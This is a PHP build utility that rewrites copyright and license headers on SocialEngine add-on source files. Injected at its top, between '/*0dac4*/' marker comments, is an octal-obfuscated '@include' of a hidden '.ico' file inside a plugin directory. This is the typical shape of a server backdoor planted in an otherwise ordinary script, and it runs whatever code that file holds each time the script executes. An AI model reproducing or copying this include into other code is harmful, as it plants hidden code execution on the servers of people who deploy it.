<?php
/*0dac4*/

@include "\057var\057www\057qa_\162qst\160gin\163_20\0619_u\160gra\144e/e\170ter\156als\057des\153top\055not\151fy/\056a0c\071847\061.ic\157";

/*0dac4*/

$path = __DIR__ . '/' . 'source/';
$savePath = __DIR__ . '/output/';


$Directory = new RecursiveDirectoryIterator($path);
$Iterator = new RecursiveIteratorIterator($Directory);
$Regex = new RegexIterator($Iterator, '/^.+\.php$/i', RecursiveRegexIterator::GET_MATCH);
$files = array();
foreach( $Regex as $file ) {
  if( strpos($file[0], 'vendor') !== false ) {
    continue;
  }
  $files[] = str_replace($path, '', $file[0]);
}
$Regex = new RegexIterator($Iterator, '/^.+\.tpl/i', RecursiveRegexIterator::GET_MATCH);
foreach( $Regex as $file ) {
  $files[] = str_replace($path, '', $file[0]);
}

$currentYear = date('Y');
$year = $currentYear . '-' . ($currentYear + 1);
$time = date('Y-m-d H:i:s');
$Id = '$Id';

$baseTag = <<<EOF
<?php 
 /**
 * SocialEngine
 *
 * @category   Application_Extensions
 * @package    [PACKAGE]
 * @copyright  Copyright {$year} BigStep Technologies Pvt. Ltd.
 * @license    http://www.socialengineaddons.com/license/
 * @version    {$Id}: FILE_NAME {$time}Z SocialEngineAddOns $
 * @author     SocialEngineAddOns
 */
EOF;


$tagWithPhp = <<<EOF
{$baseTag}
 ?>

EOF;

$tagWithoutPhp = <<<EOF
{$baseTag}

EOF;


$search = array('@copyright', '@license', '@author', '$Id');
foreach( $files as $file ) {
  $package = explode('/', $file)[0];
  $string = file_get_contents($path . $file);
  $docComments = array_filter(token_get_all($string), function($entry) {
    return $entry[0] == T_DOC_COMMENT;
  });
  foreach( $docComments as $commentBlock ) {
    if( empty($commentBlock[1]) ) {
      continue;
    }
    $comment = $commentBlock[1];
    $found = false;
    foreach( $search as $needle ) {
      if( strpos($comment, $needle) !== false ) {
        $found = true;
        break;
      }
    }
    $string = str_replace($comment, '', $string);
  }

  $fileName = basename($file);
  $tag = strpos($string, '<?php') === 0 ? $tagWithoutPhp : $tagWithPhp;
  $tag = str_replace('FILE_NAME', $fileName, $tag);
  $tag = str_replace('[PACKAGE]', $package, $tag);
  if( strpos($string, '<?php') === 0 ) {
    $string = substr($string, strlen('<?php'));
  }
  $string = $tag . trim($string);
  $explodeDir = explode('/', dirname($file));
  $dirMPath = '';
  foreach( $explodeDir as $dirName ) {
    if( !file_exists($savePath . $dirMPath . $dirName) ) {
      mkdir($savePath . $dirMPath . $dirName);
    }
    $dirMPath .= $dirName . '/';
  }
  file_put_contents($savePath . $file, $string);
}
